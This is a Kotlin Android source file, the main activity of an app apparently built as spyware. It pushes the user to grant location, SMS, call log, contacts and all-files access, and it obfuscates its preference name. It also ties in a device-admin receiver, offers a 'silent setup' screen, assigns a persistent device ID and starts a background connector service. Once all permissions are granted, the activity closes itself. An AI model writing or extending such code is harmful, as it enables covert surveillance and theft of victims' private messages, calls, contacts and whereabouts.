package com.nexlink.bridge

import com.nexlink.bridge.ObfStr

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.util.Log
import com.nexlink.bridge.databinding.ActivityMainBinding
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences(ObfStr.mainPrefsName(), Context.MODE_PRIVATE) }

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        Log.d("MainActivity", "onCreate")

        ensureDeviceId()
        startConnectorService()

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(this, SilentSetupActivity::class.java))
        }

        binding.btnLaunch.setOnClickListener {
            hideAndExit()
        }

        updateUI()
    }

    override fun onResume() {
        super.onResume()
        if (!isFinishing) updateUI()
    }

    private fun updateUI() {
        val allPermsOk = allPermissionsGranted()

        Log.d("MainActivity", "updateUI allPermsOk=$allPermsOk")

        if (allPermsOk) {
            hideAndExit()
            return
        }

        val missing = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File (All Files Access)")

        Log.d("MainActivity", "missing = ${missing.joinToString()}")
        binding.tvAccessStatus.text = "Izin yang belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin."
        binding.tvAccessStatus.setTextColor(getColor(R.color.red))
        binding.btnAccessibility.text = "Berikan Izin →"
        binding.btnAccessibility.visibility = View.VISIBLE
        binding.btnLaunch.visibility = View.GONE
    }

    private fun allPermissionsGranted(): Boolean {
        val runtimeOk = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        return runtimeOk && storageOk
    }

    private fun hideAndExit() {
        finish()
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            val androidId = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            )
            val id = if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c")
                androidId
            else
                UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "startForegroundService error", e)
        }
    }
}
